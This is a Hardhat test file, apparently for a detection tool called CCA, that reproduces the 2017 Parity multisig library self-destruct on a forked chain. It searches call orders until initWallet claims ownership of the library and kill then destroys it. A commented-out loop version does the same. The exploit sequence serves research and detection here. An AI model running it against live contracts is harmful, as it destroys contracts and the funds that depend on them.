import { expect } from 'chai'
import { ethers, network } from 'hardhat'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
import { Contract } from 'ethers'

describe('CCA Detects Parity Kill Test', async function () {
    let alice: SignerWithAddress
    let WalletLibrary: Contract
    let walletLibraryAddress: string

    async function handleIsOwner(walletLibrary: Contract, address: string) {
        return await walletLibrary.isOwner(address)
    }

    async function handleInitWallet(walletLibrary: Contract, address: string) {
        const ownerArray = [address]
        return await walletLibrary.initWallet(ownerArray, 0, 0)
    }

    async function handleKill(walletLibrary: Contract, address: string) {
        return await walletLibrary.kill(address)
    }

    async function checkIncident() {
        let code = await ethers.provider.getCode(walletLibraryAddress)
        let balance = await ethers.provider.getBalance(walletLibraryAddress)
        if (code == '0x' && balance == 0n) {
            return true
        }
    }

    beforeEach(async () => {
        ;[alice] = await ethers.getSigners()
        WalletLibrary = await ethers.getContractAt('parity', '0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
        walletLibraryAddress = await WalletLibrary.getAddress()
        expect(walletLibraryAddress).to.equal('0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
    })
    it('should block number equal to 4501735', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(4501735)
    })

    it('should try all function call combinations to kill the wallet', async function () {
        const actions = [handleIsOwner, handleInitWallet, handleKill]

        async function dfs(actionSequence: string[] = [], depth = 0): Promise<boolean> {
            if (depth === actions.length) {
                return false
            }

            for (let i = depth; i < actions.length; i++) {
                await actions[i](WalletLibrary, alice.address)
                actionSequence.push(actions[i].name)

                if (await checkIncident()) {
                    console.log(`Triggering action sequence: ${actionSequence.join(' -> ')}`)
                    return true
                }

                let result = await dfs(actionSequence, depth + 1)
                if (result) return true

                actionSequence.pop()
            }
            return false
        }

        let found = await dfs()
        if (!found) {
            console.log('No selfdestruct sequence found.')
        }
    })
})

// it('should try all function call combinations to kill the wallet', async function () {
//     const actions = [handleIsOwner, handleInitWallet, handleKill]
//     for (let i = 0; i < actions.length; i++) {
//         for (let j = 0; j < actions.length; j++) {
//             for (let k = 0; k < actions.length; k++) {
//                 let actionBefore = await checkIncident()
//                 if (!actionBefore && i != j && i != k && j != k) {
//                     await actions[i](WalletLibrary, alice.address)
//                     await actions[j](WalletLibrary, alice.address)
//                     await actions[k](WalletLibrary, alice.address)

//                     let actionAfter = await checkIncident()

//                     if (actionAfter) {
//                         console.log(
//                             `Triggering action sequence: ${actions[i].name} -> ${actions[j].name} -> ${actions[k].name}`,
//                         )
//                         return
//                     }
//                 }
//             }
//         }
//     }
//     console.log('No selfdestruct sequence found.')
// })
